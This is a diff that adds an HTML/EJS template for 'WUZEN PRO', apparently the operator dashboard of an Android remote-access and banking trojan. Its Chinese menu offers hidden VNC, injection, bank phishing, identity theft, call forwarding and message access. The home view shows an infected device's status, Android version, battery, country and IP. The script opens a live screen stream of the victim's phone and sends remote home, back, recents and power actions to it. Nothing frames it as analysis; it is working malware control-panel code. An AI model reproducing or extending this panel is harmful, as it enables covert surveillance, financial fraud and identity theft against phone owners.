@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+    <title>WUZEN PRO</title>
+    <meta charset="UTF-8">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100..900&amp;display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <link rel="icon" href="/assets/icon.png" type="image/png">
+</head>
+
+<body>
+    <style type="text/css">
+        * {
+            font-family: "Noto Sans TC", sans-serif;
+            padding: 0;
+            margin: 0;
+            outline: 0;
+        }
+
+        body {
+            background: linear-gradient(to right, rgb(2, 46, 78), rgb(2, 26, 78), rgb(58, 2, 78), rgb(76, 3, 112));
+            background-size: 200%;
+            background-repeat: no-repeat;
+            padding-left: 10px;
+            height: 100vh;
+            animation: gradientFlow 25s ease-in-out infinite;
+            overflow: hidden;
+        }
+
+        @keyframes gradientFlow {
+            0% {
+                background-position: 0% 0%;
+            }
+
+            50% {
+                background-position: 100%;
+            }
+
+            100% {
+                background-position: 0% 0%;
+            }
+        }
+
+        .sidebar {
+            width: 60%;
+            background-color: rgba(0, 0, 0, 0.2);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(18px);
+            color: white;
+            text-align: center;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: -60%;
+            transition: .5s ease;
+            z-index: 999999;
+            overflow-y: auto;
+        }
+
+        .items {
+            display: flex;
+            align-items: center;
+            height: 10px;
+            padding: 20px;
+        }
+
+        .items:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .items img {
+            object-fit: contain;
+            margin-right: 10px;
+            width: 25px;
+            height: 30px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 30px;
+            position: relative;
+            z-index: 999;
+        }
+
+        .ic {
+            height: 80px;
+            width: 80px;
+            filter: drop-shadow(0 0 5px rgba(0, 0, 0, 0.3));
+        }
+
+        .title {
+            height: 80px;
+            width: 80px;
+            filter: drop-shadow(0 0 5px rgba(0, 0, 0, 0.3));
+            margin-left: -10px;
+        }
+
+        .active {
+            background-color: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .mobile {
+            justify-content: right;
+            width: calc(100% - 20px);
+            padding-right: 20px;
+            filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.3));
+            position: fixed;
+            top: 25px;
+            right: 0px;
+        }
+
+        .bar {
+            width: 50px;
+            height: 50px;
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            backdrop-filter: blur(8px);
+            line-height: 50px;
+            text-align: center;
+            z-index: 9999;
+        }
+
+        .bar img {
+            width: 35px;
+            height: 30px;
+            margin-top: 13px;
+        }
+
+        ::-webkit-scrollbar {
+            display: none;
+        }
+
+        .nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 80px;
+            z-index: 999;
+        }
+
+        #home,
+        #vnc {
+            position: absolute;
+            top: 80px;
+            left: 0;
+            width: 100%;
+            height: calc(100vh - 80px);
+            border: none;
+        }
+
+        .alert {
+            position: relative;
+            top: 20px;
+            left: 10px;
+            width: 70%;
+            min-height: 20px;
+            height: auto;
+            border-radius: 15px;
+            background-color: rgba(200, 200, 200, 0.5);
+            backdrop-filter: blur(8px);
+            z-index: 999999999;
+            color: white;
+            padding: 15px;
+            white-space: normal;
+            word-wrap: break-word;
+            line-height: 1.5;
+            margin-top: 10px;
+            text-shadow: 0px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        @media (min-width: 1024px) {
+
+            #home,
+            #vnc {
+                width: 80%;
+                right: 0;
+                left: auto;
+            }
+
+            .sidebar {
+                display: block;
+                left: 0;
+                width: 20%;
+            }
+
+            .alert {
+                width: 30%;
+            }
+        }
+
+        .load {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 99999;
+            display: none;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.2);
+            align-items: center;
+        }
+
+        .loader {
+            width: 65px;
+            aspect-ratio: 1;
+            position: relative;
+        }
+
+        .loader:before,
+        .loader:after {
+            content: "";
+            position: absolute;
+            border-radius: 50px;
+            box-shadow: 0 0 0 3px inset #fff;
+            animation: l5 2.5s infinite;
+        }
+
+        .loader:after {
+            animation-delay: -1.25s;
+            border-radius: 0;
+        }
+
+        @keyframes l5 {
+            0% {
+                inset: 0 35px 35px 0
+            }
+
+            12.5% {
+                inset: 0 35px 0 0
+            }
+
+            25% {
+                inset: 35px 35px 0 0
+            }
+
+            37.5% {
+                inset: 35px 0 0 0
+            }
+
+            50% {
+                inset: 35px 0 0 35px
+            }
+
+            62.5% {
+                inset: 0 0 0 35px
+            }
+
+            75% {
+                inset: 0 0 35px 35px
+            }
+
+            87.5% {
+                inset: 0 0 35px 0
+            }
+
+            100% {
+                inset: 0 35px 35px 0
+            }
+        }
+
+
+
+
+        .homeInfo {
+            height: auto;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            box-shadow: 0 0px 3px rgba(255, 255, 255, 0.2);
+            margin: 0 auto;
+            width: calc(100% - 80px);
+            color: #fafafa;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+            font-size: 18px;
+            position: relative;
+            backdrop-filter: blur(18px);
+        }
+
+        .status {
+            position: absolute;
+            top: 5px;
+            left: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding-left: 10px;
+            padding-top: 8px;
+        }
+
+        .status img {
+            width: 20px;
+            height: 20px;
+            margin-right: 3px;
+        }
+
+        .online::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #0dd;
+            position: absolute;
+            top: 12px;
+            left: -5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .offline::after {
+            content: '';
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #f05;
+            position: absolute;
+            top: 12px;
+            left: -5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+
+
+
+        #vnc img,
+        #videoscreen {
+            height: 300px;
+            width: 150px;
+            top: calc(50% - 150px);
+            left: calc(50% - 75px);
+            touch-action: none;
+            cursor: pointer;
+            position: fixed;
+            border: 1px solid white;
+            overflow: hidden;
+            border: 1px solid green;
+        }
+
+        #vnc #buttons {
+            display: flex;
+            position: fixed;
+            top: 150px;
+            right: 5%;
+            flex-direction: column;
+            align-items: flex-end;
+            width: 15%;
+            height: auto;
+            z-index: 9999;
+            background-color: rgba(255, 255, 255, .2);
+            border-radius: 40px;
+            backdrop-filter: blur(10px);
+        }
+
+        #vnc button {
+            height: 80px;
+            width: 100%;
+            background: transparent;
+            border: 0;
+            color: white;
+            border-radius: 30px;
+        }
+
+        #vnc button svg {
+            height: 24px;
+            width: 24px;
+        }
+
+        #vnc button:hover {
+            background-color: rgba(255, 255, 255, .2);
+        }
+
+        .options {
+            position: fixed;
+            top: 80px;
+            left: 10%;
+            z-index: 9999;
+            width: 80%;
+            display: flex;
+            height: 50px;
+            background-color: rgba(255, 255, 255, .2);
+            border-radius: 30px;
+            backdrop-filter: blur(10px);
+        }
+
+        #vnc .options button {
+            width: calc((100%)/2);
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 50px;
+        }
+
+        #vnc .options button svg {
+            margin-right: 10px;
+        }
+
+        .options button:hover {
+            background-color: rgba(255, 255, 255, .2);
+        }
+
+
+
+        @media (min-width: 1024px) {
+            .f {
+                display: flex;
+                align-items: flex-start;
+                justify-content: center;
+                position: relative;
+                height: 100%;
+                width: 70%;
+            }
+
+            .vcontainer,
+            .btns {
+                width: 45%;
+                position: relative;
+                height: 100%;
+            }
+
+            .btns {
+                padding-right: 20%;
+                display: flex;
+                flex-direction: column;
+                align-items: flex-end;
+            }
+
+            #videoscreen,
+            #video {
+                position: absolute;
+            }
+
+            #vnc .options,
+            #vnc #buttons {
+                position: relative;
+                display: flex;
+                flex-direction: column;
+                height: auto;
+                width: 20%;
+                backdrop-filter: none;
+                border-radius: 0 0 30px 30px;
+            }
+
+            #vnc .options {
+                height: 27%;
+                width: 40%;
+                top: 0;
+                border-radius: 30px 30px 0 30px;
+            }
+
+            #vnc #buttons {
+                height: 67%;
+                bottom: 0;
+                right: -10%;
+                top: auto;
+            }
+
+            #vnc button,
+            .options button {
+                height: calc(100%/4);
+                width: 100%;
+                margin-top: 10px;
+                background: transparent;
+                padding: 0;
+                margin: 0;
+            }
+
+            #vnc .options button {
+                height: calc(100%/2);
+                width: 100%;
+            }
+        }
+    </style>
+    <div class="load" style="display: none;">
+        <div class="loader"></div>
+    </div>
+
+
+    <div class="nav">
+        <div class="logo mobile">
+            <img src="/icon.png" class="ic">
+            <img src="/text.png" class="title">
+        </div>
+
+        <div class="bar">
+            <img src="/manage.png">
+        </div>
+    </div>
+
+
+    <div class="sidebar" style="left: 0%;">
+
+        <br><br>
+
+        <div class="logo">
+            <img src="/icon.png" class="ic">
+            <img src="/text.png" class="title">
+        </div>
+
+        <br><br>
+
+        <div class="items active">
+
+            <img src="/home2.png"> <span>首页</span>
+
+        </div>
+
+        <div class="items">
+
+            <img src="/desktop.png"> <span>隐藏的 VNC</span>
+
+        </div>
+
+        <div class="items">
+
+            <img src="/inject.png"> <span>注入</span>
+
+        </div>
+
+        <div class="items">
+
+            <img src="/bank.png" style="transform:scale(1.25);"> <span>网络钓鱼</span>
+
+        </div>
+
+        <div class="items">
+
+            <img src="/contact.png"> <span>窃取身份</span>
+
+        </div>
+
+        <div class="items">
+
+            <img src="/info.png"> <span>应用防火墙</span>
+
+        </div>
+
+        <div class="items">
+
+            <img src="/bell.png"> <span>通知</span>
+
+        </div>
+        <div class="items">
+            <img src="/message.png"> <span>消息</span>
+
+        </div>
+        <div class="items">
+            <img src="/arrow.png"> <span>呼叫转发</span>
+
+        </div>
+        <div class="items">
+            <img src="/launch.png"> <span>启动意图</span>
+
+        </div>
+        <div class="items">
+            <img src="/toolkit.png"> <span>工具包</span>
+
+        </div>
+        <div class="items">
+            <img src="/cog.png"> <span>设置</span>
+
+        </div>
+        <div class="items">
+            <img src="/signout.png"> <span>注销</span>
+
+        </div>
+        <br><br>
+        <br><br>
+
+    </div>
+
+
+    <div id="home">
+
+
+        <div class="homeInfo">
+            <br>
+            <%= device %>
+            <span class="status <%= status ? 'online' : 'offline' %>"><%= status ? "在线的" : "离线" %></span>
+            <br><br>
+            <span style="float:left">Android <%= os_version %></span> <span style="float:right">电池: <%= battery %>%</span>
+            <br><br>
+            <span style="float:left">国家/地区: <%= country %></span> <span style="float:right"><%= ip %></span>
+            <br><br>
+            <span style="float:left"><%= new Date(issued).toLocaleString('zh-CN', {
+day: '2-digit',
+month: '2-digit',
+year: 'numeric',
+hour: '2-digit',
+minute: '2-digit',
+second: '2-digit',
+hour12: false,
+}) %></span>
+            <br><br>
+        </div>
+
+    </div>
+
+
+
+
+
+    <div id="vnc" style="display:none">
+        <div class="f">
+            <div class="btns">
+                <div class="options">
+
+                    <button onclick="hideSkeleton(this);">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                            <path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7 7 0 0 0 2.79-.588M5.21 3.088A7 7 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474z" />
+                            <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12z" />
+                        </svg> 隐藏节点
+                    </button>
+
+
+                    <button onclick="hideScreen(this);">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                            <path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7 7 0 0 0 2.79-.588M5.21 3.088A7 7 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474z" />
+                            <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12z" />
+                        </svg> 隐藏屏幕 </button>
+
+
+                </div>
+
+
+
+                <div id="buttons">
+
+
+                    <button onclick="sendGlobalAction('o')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                            <path d="M7.5 1v7h1V1z" />
+                            <path d="M3 8.812a5 5 0 0 1 2.578-4.375l-.485-.874A6 6 0 1 0 11 3.616l-.501.865A5 5 0 1 1 3 8.812" />
+                        </svg></button>
+
+
+
+                    <button onclick="sendGlobalAction('r')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 17 17">
+                            <path d="M11 2a3 3 0 0 1 3 3v6a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V5a3 3 0 0 1 3-3zM5 1a4 4 0 0 0-4 4v6a4 4 0 0 0 4 4h6a4 4 0 0 0 4-4V5a4 4 0 0 0-4-4z" />
+                        </svg></button>
+
+                    <button onclick="sendGlobalAction('h')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 17 17">
+                            <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16" />
+                        </svg></button>
+
+                    <button onclick="sendGlobalAction('b');"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 14 14">
+                            <path d="M10 12.796V3.204L4.519 8zm-.659.753-5.48-4.796a1 1 0 0 1 0-1.506l5.48-4.796A1 1 0 0 1 11 3.204v9.592a1 1 0 0 1-1.659.753" />
+                        </svg></button>
+
+
+                </div>
+            </div>
+            <br>
+
+
+            <div class="vcontainer">
+                <image id="video" src="" style="opacity: 0;">
+            </div>
+
+        </div>
+    </div>
+
+
+
+
+
+    <script type="text/javascript">
+        const id = new URL(window.location.href).searchParams.get("id");
+        if (screen.height > screen.width) {
+            var maxH = 0.7 * (window.innerHeight);
+            var maxW = 0.6 * window.innerWidth;
+        } else {
+            var maxH = 0.9 * window.innerHeight;
+            var maxW = 0.9 * window.innerWidth;
+        }
+        window.onload = () => {
+            var x = ["home", "stream"];
+            Array.from(document.getElementsByClassName("items")).forEach((it, i) => {
+                it.onclick = async function() {
+                    if (i == 0) {
+                        document.querySelector('.load').style.display = 'none';
+                        document.getElementById("home").style.display = "block";
+                        document.getElementById("vnc").style.display = "none";
+                    } else if (i == 1) {
+                        document.querySelector('.load').style.display = 'flex';
+                        document.getElementById("vnc").style.display = "block";
+                        document.getElementById("home").style.display = "none";
+                        await fetch("/send", {
+                            method: "POST",
+                            headers: {
+                                "content-type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                message: "vnc",
+                                id: id
+                            })
+                        });
+                        const eventSource = new EventSource('/vnc?id=' + id);
+                        eventSource.onmessage = (event) => {
+                            document.querySelector('.load').style.display = 'none';
+                            const json = JSON.parse(event.data);
+                            var wFactor = maxW / json.width;
+                            var hFactor = (maxH - 80) / json.height;
+                            var finalFactor = Math.min(wFactor, hFactor);
+                            var video = document.getElementById('video');
+                            video.style.height = finalFactor * json.height + "px";
+                            video.style.width = finalFactor * json.width + "px";
+                            video.style.top = `calc(45% - ${(finalFactor * json.height) / 2.5}px)`;
+                            video.style.left = (window.innerHeight > window.innerWidth) ?
+                                `calc(50% - ${(finalFactor * json.width) / 2}px)` :
+                                `calc(50%)`;
+                            video.style.opacity = "1";
+                            video.src = `data:image/png;base64,${json.image}`;
+                        };
+                        eventSource.onerror = (err) => {
+                            console.log(err)
+                        }
+                    } else {
+                        document.querySelector('.load').style.display = 'flex';
+                    }
+
+                    Array.from(document.getElementsByClassName("items")).forEach((item) => {
+                        item.classList.remove("active");
+                    });
+                    it.classList.add("active");
+
+
+                };
+            });
+
+
+
+        };
+        function dialog(msg) {
+            const alertBox = document.createElement('div');
+            alertBox.className = 'alert';
+            alertBox.textContent = msg;
+            document.body.appendChild(alertBox);
+
+            setTimeout(() => {
+                alertBox.remove();
+            }, 3000);
+
+        }
+        document.querySelector('.bar').addEventListener('click', function() {
+            var sidebar = document.querySelector('.sidebar');
+            if (sidebar.style.left === "0%") {
+                sidebar.style.left = "-60%";
+            } else {
+                sidebar.style.left = "0%";
+            }
+        });
+        document.addEventListener("click", function(event) {
+
+            if (window.innerWidth > 1024) return;
+
+            if (!event.target.closest('.sidebar') && !event.target.closest('.bar')) {
+                var sidebar = document.querySelector('.sidebar');
+                if (sidebar.style.left === "0%") {
+                    sidebar.style.left = "-60%";
+                }
+            }
+        });
+
+        window.addEventListener("blur", function() {
+
+            if (window.innerWidth > 1024) return;
+
+            const sidebar = document.querySelector(".sidebar");
+            sidebar.style.left = "-60%";
+        });
+    </script>
+
+
+</body>
+
+</html>
